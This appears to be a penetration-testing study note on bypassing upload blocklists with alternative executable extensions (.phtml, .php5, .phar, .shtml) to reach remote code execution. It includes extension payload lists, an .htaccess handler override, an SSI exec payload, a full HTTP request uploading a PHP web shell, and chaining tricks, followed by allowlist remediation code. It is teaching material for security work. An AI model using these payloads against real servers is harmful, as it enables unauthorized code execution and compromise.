---
tags: [vapt, file-upload, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.04 Extension Bypass (.php5, .phtml, .phar, .shtml)"
portswigger_labs: ["Web shell upload via path traversal", "Web shell upload via obfuscated file extension"]
---

# 22.04 — Extension Bypass (.php5, .phtml, .phar, .shtml)

## What is it?
When implementing file upload restrictions, developers often use a **blocklist** approach—they explicitly deny certain known dangerous extensions like `.php` or `.exe`. However, web servers can be configured to execute a wide variety of lesser-known or legacy extensions as server-side code.

If a developer only blocks `.php`, an attacker can simply upload a file with an alternative extension like `.php5`, `.phtml`, or `.phar`. If the underlying web server (like Apache) is configured to map those extensions to the PHP interpreter, the attacker's script will execute perfectly. The same concept applies to Server-Side Includes (`.shtml`) and ASP.NET alternative extensions (`.ashx`, `.asmx`).

Think of it like a security guard told to deny entry to anyone wearing a red shirt. If an attacker walks in wearing a maroon shirt, the guard lets them pass, but they still cause the exact same damage inside.

## ASCII Diagram
```text
[Attacker]
   │
   │ 1. Tries to upload shell.php
   ▼
[Upload Filter] ─── (Blocks ".php" extension) ──> ❌ REJECTED
   │
[Attacker]
   │
   │ 2. Modifies filename to shell.phtml
   ▼
[Upload Filter] ─── (Checks blocklist: ".phtml" is not on it) ──> ✅ ALLOWED
   │
[File System] ─── 3. Saves /uploads/shell.phtml
   │
[Attacker] ────── 4. Requests GET /uploads/shell.phtml
   │
[Web Server] ──── 5. Sees .phtml, maps to PHP interpreter ──> Executes Script!
```

## How to Find It
- **Manual steps:**
  1. Identify an upload endpoint and attempt to upload a basic web shell with a `.php` extension.
  2. If it is blocked, intercept the request in Burp Suite and change the extension to an alternative, such as `.php5`, `.phtml`, or `.phar`.
  3. If the upload succeeds, try navigating to the file.
  4. If the page renders the output of your script instead of displaying the raw PHP code, you have bypassed the extension filter and achieved RCE.
  5. Also check for case-sensitivity bypasses (e.g., `.pHp` or `.PHP5`) if the server is hosted on Windows or uses a poorly written filter.

- **Tool commands with flags explained:**
  Using Burp Intruder to rapidly fuzz extensions:
  1. Send the upload request to Intruder.
  2. Place a payload position marker on the extension: `filename="shell.§php§"`
  3. Load a list of alternative extensions (e.g., `phtml`, `php3`, `php5`, `shtml`, `phar`).
  4. Review the results to see which ones successfully upload (200 OK) and execute.

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Determine the target's technology stack (e.g., PHP vs. ASP.NET).
  2. Attempt to upload a `.htaccess` file first to actively reconfigure the server to execute your extension. For example, upload `.htaccess` containing `AddType application/x-httpd-php .jpg`. 
  3. If `.htaccess` uploads are blocked or ineffective, cycle through the list of alternative executable extensions for the target technology.
  4. Upload your payload using the bypass extension (e.g., `shell.phtml`).
  5. Trigger the payload by navigating directly to it.

- **Actual payloads:**
  **PHP Alternatives:**
  ```text
  .php3, .php4, .php5, .php7, .phtml, .phar, .phps
  ```
  **Server-Side Includes (SSI) Alternatives:**
  ```text
  .shtml, .shtm, .stm
  ```
  *(Requires payload like `<!--#exec cmd="id" -->`)*

  **ASP.NET Alternatives:**
  ```text
  .ashx, .asmx, .axd, .ascx, .master
  ```
  **.htaccess execution enabler payload:**
  ```text
  filename=".htaccess"
  Content: AddType application/x-httpd-php .jpg
  ```

- **Real HTTP request/response examples:**
  **Upload Request:**
  ```http
  POST /api/upload-avatar HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  ------WebKitFormBoundary
  Content-Disposition: form-data; name="avatar"; filename="shell.phtml"
  Content-Type: image/jpeg

  <?php system('whoami'); ?>
  ------WebKitFormBoundary--
  ```
  **Execution Response:**
  ```http
  HTTP/1.1 200 OK
  
  www-data
  ```

## Real-World Example
In a well-documented bug bounty write-up, a researcher tested an image upload feature on a major e-commerce platform. The developers had implemented a strict blocklist against `.php`, `.php3`, `.php4`, and `.php5`. However, they forgot to block `.phtml`. The researcher uploaded a webshell named `image.phtml`. Because the application's underlying Apache server was configured using standard default PHP installation scripts, it inherently treated `.phtml` files as executable PHP. The researcher navigated to `/images/image.phtml` and gained full command execution on the web server.

## How to Fix It
- **Developer remediation:**
  Never use a blocklist. Blocklists are inherently flawed because attackers will inevitably find an extension or edge-case you forgot to include. Always use a strict **allowlist** of acceptable extensions (e.g., `['.jpg', '.png', '.pdf']`). Before comparing the extension against the allowlist, extract the true final extension and convert it to lowercase. Furthermore, store uploaded files outside the web root, or configure the web server directory to explicitly disable script execution (e.g., removing the handler for all PHP types in the `/uploads/` directory).

- **Code snippet:**
  **Python (Strict Allowlist Approach):**
  ```python
  from pathlib import Path

  ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.pdf'}

  def validate_upload(filename):
      # Extract the suffix and convert to lowercase to defeat case bypasses (.PhP)
      ext = Path(filename).suffix.lower()
      
      if ext not in ALLOWED_EXTENSIONS:
          raise ValueError(f"Extension '{ext}' is explicitly denied.")
      
      return True
  ```

## Chaining Opportunities
- This vuln + [[14 - Overwriting Existing Files]] → If you can overwrite a critical `.user.ini` file in a PHP-FPM environment, you can set `auto_prepend_file=shell.jpg` to force the server to execute a seemingly innocent `.jpg` file before every legitimate PHP file.
- This vuln + [[23 - Path Traversal]] → Combine extension bypass with path traversal (e.g., `../../shell.phtml`) to place the executable file in a directory where the web server has fewer execution restrictions than the strict `/uploads/` folder.

## Related Notes
- [[02 - Unrestricted File Upload — Webshell Upload]]
- [[03 - Content-Type Bypass]]
- [[05 - Double Extension (file.php.jpg)]]
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
